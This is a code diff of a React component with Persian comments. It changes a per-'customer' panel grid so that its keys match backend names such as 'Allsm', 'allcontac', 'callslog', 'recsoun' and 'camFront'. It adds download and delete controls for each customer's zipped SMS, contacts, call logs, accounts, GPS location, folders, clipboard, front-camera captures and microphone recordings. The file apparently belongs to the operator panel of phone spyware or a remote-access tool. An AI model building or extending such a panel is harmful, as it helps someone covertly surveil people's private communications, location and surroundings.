@@ -39,33 +39,47 @@ const PANEL_COLORS = [
   "bg-[rgba(56,189,248,0.19)]",
 ];
 
-// اسامی ثابت و آیکون‌های هر باکس (۱۲ تایی)
+// اسم کلیدها باید دقیقا با property فانکشن supabase یکی باشد!
 const FEATURE_KEYS = [
   "State",
-  "Sms",
-  "Contacts",
-  "Calls",
-  "Accounts",
-  "Location",
-  "Folders",
-  "Clipboards",
-  "Camera",
-  "Microphone",
-  "IP",
+  "Allsm",
+  "allcontac",
+  "callslog",
+  "Allmalist",
+  "GPS",
+  "TotFolders",
+  "clipboard",
+  "camFront",
+  "recsoun",
+  "pi",
   "Download",
 ];
+const FEATURE_LABELS: Record<string, string> = {
+  State: "State",
+  Allsm: "Sms",
+  allcontac: "Contacts",
+  callslog: "Calls",
+  Allmalist: "Accounts",
+  GPS: "Location",
+  TotFolders: "Folders",
+  clipboard: "Clipboards",
+  camFront: "Camera",
+  recsoun: "Microphone",
+  pi: "IP",
+  Download: "Download",
+};
 const FEATURE_ICONS: Record<string, any> = {
   State: Activity,
-  Sms: MessageCircle,
-  Contacts: BookUser,
-  Calls: Phone,
-  Accounts: CreditCard,
-  Location: MapPin,
-  Folders: Folder,
-  Clipboards: ClipboardList,
-  Camera: Camera,
-  Microphone: Mic,
-  IP: Globe2,
+  Allsm: MessageCircle,
+  allcontac: BookUser,
+  callslog: Phone,
+  Allmalist: CreditCard,
+  GPS: MapPin,
+  TotFolders: Folder,
+  clipboard: ClipboardList,
+  camFront: Camera,
+  recsoun: Mic,
+  pi: Globe2,
   Download: Download,
 };
 
@@ -79,18 +93,14 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
   const [downloadingIndex, setDownloadingIndex] = useState<number | null>(null);
   const [deletingIndex, setDeletingIndex] = useState<number | null>(null);
 
-  // ویژگی‌ها (state) تا حذف و کمرنگ کردن هر ویژگی به شکل داینامیک انجام شود
   const [properties, setProperties] = useState<Record<string, string>>(
     customer?.additionalProperties || {}
   );
-  // فایل کلی زیپ (state) برای مدیریت فعال/غیرفعال بودن دکمه حذف کلی
   const [hasMainZip, setHasMainZip] = useState(false);
 
-  // بررسی وجود فایل کلی هنگام لود و هر بار تغییر customer
   useEffect(() => {
     const checkMainZipExists = async () => {
       try {
-        // مسیر فایل کلی را با توجه به سرور خودت تغییر بده
         const res = await fetch(`/uploads/${customer.id}_.zip`, { method: "HEAD" });
         setHasMainZip(res.ok);
       } catch {
@@ -104,7 +114,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
   const panels = FEATURE_KEYS.map((propertyName, idx) => {
     const Icon = FEATURE_ICONS[propertyName] || Download;
     const value = properties[propertyName] || "";
-    const isEmpty = !Object.prototype.hasOwnProperty.call(properties, propertyName);
+    const isActive = !!value; // فعال بودن باکس بر اساس وجود فایل
 
     // pattern برای حذف همه فایل‌های این ویژگی
     const pattern = `${customer.id}${propertyName}*`;
@@ -113,11 +123,10 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
     // باکس آخر: Download کلی (zip همه فایل‌ها)
     if (propertyName === "Download") {
       const mainZipPattern = `${customer.id}_*.zip`;
-      // حالت باکس دانلود کلی
       return {
         icon: Download,
-        title: "Download",
-        isEmpty: !hasMainZip,
+        title: FEATURE_LABELS["Download"],
+        isActive: hasMainZip,
         content: (
           <div className="flex flex-col items-center justify-center min-h-[60px] py-4">
             <div className="flex flex-row justify-center items-center gap-6">
@@ -125,7 +134,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                 size="icon"
                 variant="ghost"
                 style={{
-                  color: "#22c55e", // سبز
+                  color: "#22c55e",
                   background: "transparent",
                 }}
                 title={
@@ -150,7 +159,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                 size="icon"
                 variant="ghost"
                 style={{
-                  color: "#ef4444", // قرمز ملایم
+                  color: "#ef4444",
                   background: "transparent",
                 }}
                 title={
@@ -171,10 +180,9 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                       const result = await deleteCustomerFilesByPattern(mainZipPattern);
                       alert(result);
                       setHasMainZip(false);
-                      // اگر همه ویژگی‌ها خالی بود صفحه را رفرش کن
                       if (
                         !FEATURE_KEYS.slice(0, 11).some((key) =>
-                          Object.prototype.hasOwnProperty.call(properties, key)
+                          !!properties[key]
                         )
                       ) {
                         setTimeout(() => {
@@ -203,29 +211,34 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
     // سایر باکس‌ها
     return {
       icon: Icon,
-      title: propertyName,
-      isEmpty,
+      title: FEATURE_LABELS[propertyName] || propertyName,
+      isActive,
       content: (
         <div className="flex flex-col min-h-[60px] justify-between">
-          <p
-            className={`text-lg font-vazir ${
-              isEmpty ? "text-gray-400 italic" : "font-medium text-black"
-            }`}
-          >
-            {value}
-          </p>
+          {/* فقط خود مقدار فایل را نمایش نده! اگر فقط اکتیو بودن مهم است */}
+          {/* اگر دوست داشتی این خط را فعال کن تا مثلا یک تیک سبز نمایش بده */}
+          {isActive && (
+            <div className="flex items-center justify-center text-green-600 text-2xl py-2">
+              <span>✔️</span>
+            </div>
+          )}
+          {!isActive && (
+            <div className="flex items-center justify-center text-gray-400 text-lg italic py-2">
+              <span>{language === "fa" ? "ندارد" : "No file"}</span>
+            </div>
+          )}
           <div className="flex justify-end mt-2 gap-2">
             <Button
               size="icon"
               variant="ghost"
-              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
+              className={!isActive ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
               title={
                 language === "fa"
                   ? "دانلود فایل این ویژگی"
                   : "Download this property file"
               }
               onClick={async () => {
-                if (isEmpty) return;
+                if (!isActive) return;
                 setDownloadingIndex(idx);
                 try {
                   await downloadCustomerZip(zipFileName);
@@ -233,7 +246,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                   setDownloadingIndex(null);
                 }
               }}
-              disabled={downloadingIndex === idx || isEmpty}
+              disabled={downloadingIndex === idx || !isActive}
             >
               <Download className="w-5 h-5" />
             </Button>
@@ -244,39 +257,34 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                 color: "#ef4444",
                 background: "transparent",
               }}
-              className={isEmpty ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
+              className={!isActive ? "!p-1 opacity-50 cursor-not-allowed" : "!p-1"}
               title={
                 language === "fa"
                   ? "حذف فایل این ویژگی"
                   : "Delete this property file"
               }
               onClick={async () => {
-                if (isEmpty) return;
+                if (!isActive) return;
                 if (
                   window.confirm(
                     language === "fa"
-                      ? `آیا مطمئن هستید که می‌خواهید همه فایل‌های ویژگی "${propertyName}" این مشتری را حذف کنید؟`
-                      : `Are you sure you want to delete all files for property "${propertyName}"?`
+                      ? `آیا مطمئن هستید که می‌خواهید همه فایل‌های ویژگی "${FEATURE_LABELS[propertyName] || propertyName}" این مشتری را حذف کنید؟`
+                      : `Are you sure you want to delete all files for property "${FEATURE_LABELS[propertyName] || propertyName}"?`
                   )
                 ) {
                   setDeletingIndex(idx);
                   try {
                     const result = await deleteCustomerFilesByPattern(pattern);
                     alert(result);
-                    // فقط این ویژگی را از state حذف کن تا کمرنگ و غیرفعال شود
                     setProperties((prev) => {
                       const newProps = { ...prev };
                       delete newProps[propertyName];
                       return newProps;
                     });
-                    // اگر همه ویژگی‌ها خالی بود و فایل کلی نبود صفحه را رفرش کن
                     if (
                       !hasMainZip &&
                       !FEATURE_KEYS.slice(0, 11).some((key) =>
-                        Object.prototype.hasOwnProperty.call(
-                          { ...properties, [propertyName]: undefined },
-                          key
-                        )
+                        !!(key === propertyName ? undefined : properties[key])
                       )
                     ) {
                       setTimeout(() => {
@@ -295,7 +303,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
                   }
                 }
               }}
-              disabled={deletingIndex === idx || isEmpty}
+              disabled={deletingIndex === idx || !isActive}
             >
               <Trash2 className="w-5 h-5" />
             </Button>
@@ -333,7 +341,7 @@ const CustomerInfoPanels = ({ customer }: CustomerInfoPanelsProps) => {
             <CardHeader className="pb-2">
               <CardTitle
                 className={`flex items-center text-base font-semibold font-vazir tracking-tight ${
-                  panel.isEmpty ? "text-gray-400 italic" : "text-black"
+                  !panel.isActive ? "text-gray-400 italic" : "text-black"
                 }`}
               >
                 <panel.icon className="mr-2 h-5 w-5" />
